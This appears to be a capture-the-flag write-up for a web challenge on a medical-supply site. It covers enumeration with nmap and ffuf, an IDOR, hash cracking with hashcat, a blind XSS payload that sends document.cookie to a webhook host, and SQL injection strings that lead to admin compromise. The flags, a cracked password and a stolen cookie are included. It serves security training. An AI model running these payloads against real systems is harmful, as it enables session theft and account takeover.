**Target** : https://100.55.41.187/

---
### **FLAGS FOUND**
- `FLAG{SQLI_Full_Admin_compromise}`
- `FLAG{Blind_XSS_Account_TakeOver}`
- `FLAG{Horizontal_priv_Esc}`
- `FLAG{Broken_Access_Control}`
- `FLAG{Fu33ing_Wins}`
---
#### Plan
- **Enumeration**
	- Nmap scan for open services
	- endpoint search through `ffuf`
	- Site exploration with burpsuite
- **Vulnerability detection**
	- SQL injection
		- Common SQL `admin' OR 1=1 --`
	- HASH cracking
	- XSS -> Session hijacking

---

# Execution

## I) Enumeration
### **NMAP** results
```Bash
sudo nmap -sS -sV 100.55.41.187
```
![[INSA-CHALLENGE-9-5-2026-NMAP_Results.png]]
NMAP scan results show that port **80** and **8080** are open (*HTTP*, and likely *SMTP*). Both running on *`Node.js`* + *`Express`*.

**Note** : We can safely assume port **20**(*SSH*) is hardened as the IP is hosted by **AWS**.

### **FFUF** results
```Bash
sudo ffuf -u http://100.55.41.187/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```
![[INSA-CHALLENGE-9-5-2026-FFUF_Results.png]]
#### Open endpoints:
- **dashboard** - *302* - Dashboard page
- **internal** - *302* - (Backend/api)
- **js** - *301* - ?
- **login** - *200* - Login page 
- **Login** - *200* - Login page
- **Logout** - *302* - logout
- **profile** - *302* - profile page
- **register** - *200* - Register page
- **support** - *302* - Support page
- **Support** - *302* - Support page
![[INSA-CHALLENGE-9-5-2026-FFUF_Results_2.png]]
Fuzzing deeper into the internal endpoint shows the `/internal/api/account` endpoint. Going further, we can find `/internal/api/account/details` endpoint which when called after registering and logging in, responds with the first flag. 
![[INSA-CHALLENGE-9-5-2026-Endpoint_exploration_1.png]]
`FLAG{Fu33ing_Wins}`

### Site exploration
The site has a simple registration process, however it has a **broken OTP** which can be skipped entirely by going to the dashboard page. Registration provides a cookie to access other endpoints.

While exploring the site, there is a orders page which accesses a `/api/public-orders` API which can be abused later on as it provides user id's.

## II) Vulnerability detection
### **IDOR**
The response of the **`/internal/api/account/details`** endpoint also hints at a **IDOR** vulnerability. We can test this by providing the *`user_id`* parameter from a users id found in the `/public-orders` API.
![[INSA-CHALLENGE-9-5-2026-Broken_access_control_flag.png]]
The response gives us the **`FLAG{Broken_Access_Control}`** flag.

### **SQL injection**
Attempting to retrieve all user emails from the *`/public-orders`* endpoint and attempting SQL injection through burp-suite intruder sniper attack gives no results and no potential admin target. However we can still pick an email to target by cracking the password hash.

### **Hash cracking**
By picking the email **`addis.general@medsupply.local`** with the hash **`$2b$08$jfNWcx1eg9kNxC0hMx7bMuZ2vn/hD1dyL3GleSFEY4nWp0h9ggjNS`**, attempting to crack the hash web tool should show some results.

To do this **`hashcat`** can be used with the ff command:
```Bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
*Cracked password*: `30secondstomars`

![[INSA-CHALLENGE-9-5-2026-Horizontoal_flag.png]]
Logging in and going to the dashboard gives us the third flag:
`FLAG{Horizontal_priv_Esc}`

### **XSS**
Using the XSS payload, the support page (which contains an input field) can be exploited. The payload forces the browser to throw an error and send a cookie to the *COLLABORATOR_DOMAIN*.
```html
<img src=x onerror="fetch('https://COLLABORATOR_DOMAIN/?c='+document.cookie)"/>
```
**Note** : the *COLLABORATOR_DOMAIN* can be replaced with a webhook URL.
*Ex* : https://webhook.site/eff551b3-af87-46a1-8f97-bcbc8d13c5f2
```HTML
<img src=x onerror="fetch('https://webhook.site/eff551b3-af87-46a1-8f97-bcbc8d13c5f2?c='+document.cookie)"/>
```

This is a cookie hijacking attack that returns the cookie:
```
s%3A-y5htIQweXmbXJ4ZH0bzjpWHckuv5uYe.BtHKSinI7D%2FP5FSU6q42U66tzpNIYfGvdFtPyLwbQus
```

![[INSA-CHALLENGE-9-5-2026-Vertical_flag.png]]
Using this cookie in the dashboard page lets us visit the support dashboard which gives us the fourth flag:
`FLAG{Blind_XSS_Account_TakeOver}`

### **SQL Injection**
While SQLi didn't work for the login, after gaining access to the support account, we can inject SQL into the support dashboard search bar. We can use (`' OR 1=1 --`) to get all users. This gives us the admin email (**`admin@medsupply.local`**) to get the password we use : `' UNION SELECT user_email, action, status, details FROM audit_logs--` to get the logs. From this we don't get much information other than admin email and activity, which suggests the password is simple (like `MedSupplyAdmin2026`).

After a bit of trial and error, we can finally log into the admin page and the dashboard gives us the final flag: `FLAG{SQLI_Full_Admin_compromise}`.

![[INSA-CHALLENGE-9-5-2026-FINAL_flag.png]]